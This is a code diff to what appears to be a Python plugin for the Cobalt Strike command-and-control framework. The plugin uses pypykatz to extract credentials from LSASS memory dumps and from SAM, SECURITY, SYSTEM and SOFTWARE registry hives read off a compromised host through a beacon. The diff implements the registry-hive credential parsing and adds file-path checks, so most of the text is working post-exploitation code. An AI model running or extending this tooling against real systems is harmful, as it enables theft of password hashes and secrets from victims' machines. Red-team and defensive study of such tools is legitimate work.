@@ -14,7 +14,7 @@ import pycobalt.gui as gui
 import pycobalt.events as events
 
 from pypykatz.pypykatz import pypykatz
-
+from pypykatz.registry.offline_parser import OffineRegistry
 
 def convert_size(size_bytes):
 	if size_bytes == 0:
@@ -203,28 +203,34 @@ def	parse_registry(bid, boffilepath, system_filepath, sam_filepath = None, secur
 	engine.message('security_filepath %s' % security_filepath)
 	engine.message('software_filepath %s' % software_filepath)
 	engine.message('chunksize %s' % chunksize)
-	engine.message('packages %s' % (','.join(packages)))
 
-	engine.message('not yet implemented')
-	#starttime = datetime.datetime.utcnow()
-	#bfile = BaconFileReader(bid, filepath, boffilepath, chunksize = chunksize)
-	#mimi = pypykatz.parse_minidump_external(bfile, chunksize=chunksize, packages=packages)
-	#engine.message(str(bfile))
-	#endtime = datetime.datetime.utcnow()
-	#runtime = (endtime-starttime).total_seconds()
-	#engine.message('TOTAL RUNTIME: %ss' % runtime)
-	#
-	#if 'text' in outputs:
-	#	engine.message(str(mimi))
-	#	aggressor.blog(bid, str(mimi))
-	#
-	#if 'json' in outputs:
-	#	engine.message(mimi.to_json())
-	#	aggressor.blog(bid, mimi.to_json())
-	#
-	#if 'grep' in outputs:
-	#	engine.message(mimi.to_grep())
-	#	aggressor.blog(bid, mimi.to_grep())
+	
+	system_file = BaconFileReader(bid, system_filepath, boffilepath, chunksize=chunksize)
+	sam_file = None
+	if sam_filepath is not None and len(sam_filepath) > 0:
+		sam_file = BaconFileReader(bid, sam_filepath, boffilepath, chunksize=chunksize)
+	security_file = None
+	if security_filepath is not None and len(security_filepath) > 0:
+		security_file = BaconFileReader(bid, security_filepath, boffilepath, chunksize=chunksize)
+	software_file = None
+	if software_filepath is not None and len(software_filepath) > 0:
+		software_file = BaconFileReader(bid, software_filepath, boffilepath, chunksize=chunksize)
+
+	starttime = datetime.datetime.utcnow()
+	po = OffineRegistry.from_files(system_file, sam_path = sam_file, security_path = security_file, software_path = software_file, notfile = True)
+	endtime = datetime.datetime.utcnow()
+	runtime = (endtime-starttime).total_seconds()
+	engine.message('TOTAL RUNTIME: %ss' % runtime)
+
+	engine.message(str(po))
+
+	if 'text' in outputs:
+		engine.message(str(po))
+		aggressor.blog(bid, str(po))
+	
+	if 'json' in outputs:
+		engine.message(po.to_json())
+		aggressor.blog(bid, po.to_json())
 
 
 def dialog_callback_lsass(dialog, button_name, values_dict):
@@ -238,6 +244,13 @@ def dialog_callback_lsass(dialog, button_name, values_dict):
 	bid = values_dict['bid']
 	packages = []
 	outputs = []
+
+	try:
+		with open(boffilepath, 'rb') as f:
+			f.read(100)
+	except Exception as e:
+		aggressor.show_error("Can't open BOF file! Did you get the path correct? Reason: %s" % e)
+		return
 
 	for pkg in ['all', 'msv','wdigest','kerberos','ktickets','ssp','livessp','tspkg' ,'cloudap']:
 		if pkg in values_dict and values_dict[pkg] == 'true':
@@ -272,6 +285,13 @@ def dialog_callback_registry(dialog, button_name, values_dict):
 	boffilepath = values_dict['boffilepath']
 	bid = values_dict['bid']
 	outputs = []
+
+	try:
+		with open(boffilepath, 'rb') as f:
+			f.read(100)
+	except Exception as e:
+		aggressor.show_error("Can't open BOF file! Did you get the path correct? Reason: %s" % e)
+		return
 	
 	for output in ['json','text', 'grep']:
 		if output in values_dict and values_dict[output] == 'true':
@@ -327,10 +347,10 @@ def render_dialog_pypykatz_lsass(bid):
 
 def render_dialog_pypykatz_registry(bid):
 	drows = {
-		'system_filepath': 'C:\\Users\\Administrator\\Desktop\\lsass.DMP',
-		'sam_filepath': 'C:\\Users\\Administrator\\Desktop\\lsass.DMP',
-		'security_filepath': 'C:\\Users\\Administrator\\Desktop\\lsass.DMP',
-		'software_filepath': 'C:\\Users\\Administrator\\Desktop\\lsass.DMP',
+		'system_filepath': 'C:\\Users\\Administrator\\Desktop\\SYSTEM.reg',
+		'sam_filepath': 'C:\\Users\\Administrator\\Desktop\\SAM.reg',
+		'security_filepath': 'C:\\Users\\Administrator\\Desktop\\SECURITY.reg',
+		'software_filepath': 'C:\\Users\\Administrator\\Desktop\\SOFTWARE.reg',
 		'boffilepath': 'bof/fileread.o',
 		'chunksize' : '10',
 		'json' : "false",
